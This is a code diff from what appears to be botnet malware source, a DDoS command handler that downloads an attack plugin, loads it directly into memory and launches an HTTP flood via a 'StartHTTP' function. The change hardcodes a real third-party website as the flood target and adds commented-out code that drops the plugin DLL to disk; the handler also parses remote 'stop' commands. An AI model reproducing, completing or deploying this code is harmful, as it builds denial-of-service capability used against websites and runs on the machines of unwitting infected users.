@@ -31,16 +31,21 @@ DWORD WINAPI RunDDOSThread( LPVOID lpData )
 	LPBYTE BotModule   = Plugin::Download(DDOSPlugin, NULL, &dwModuleSize);
 	if (BotModule == NULL)
 		return 0;
-	
 
 
-	
-	int Count =m_atoi(pData->Count);	
+//	PCHAR FN = "c:\\temp\\ddos.dll";
+//	File::WriteBufferA(FN, BotModule,  dwModuleSize);
+//	LoadLibraryA(FN);
+
+
+	int Count = m_atoi(pData->Count);
 	HMEMORYMODULE HHandle = MemoryLoadLibrary(BotModule);
-	typedef LPVOID (WINAPIV*TMethod)(char*,int);
+	typedef int (WINAPIV*TMethod)(char*,int);
 	TMethod M = (TMethod)MemoryGetProcAddress(HHandle, (PCHAR)"StartHTTP");
+	int R;
 	if (M != NULL) 
-		M(pData->URL,Count);
+		R = M("http://yandex.ru\0", Count);
+
 	HANDLE tmp;
 	while ( 1 )// ждем команды на выключение
 	{
@@ -67,7 +72,7 @@ DWORD WINAPI RunDDOSThread( LPVOID lpData )
 bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
 		// Запуск потока DDOS
-	PCHAR Argums=Args;
+	PCHAR Argums = Args;
 	PDDos V = CreateStruct(DDos);
 	if (Args[0]=='s'&&Args[1]=='t'&&Args[2]=='o'&&Args[3]=='p')
 	{
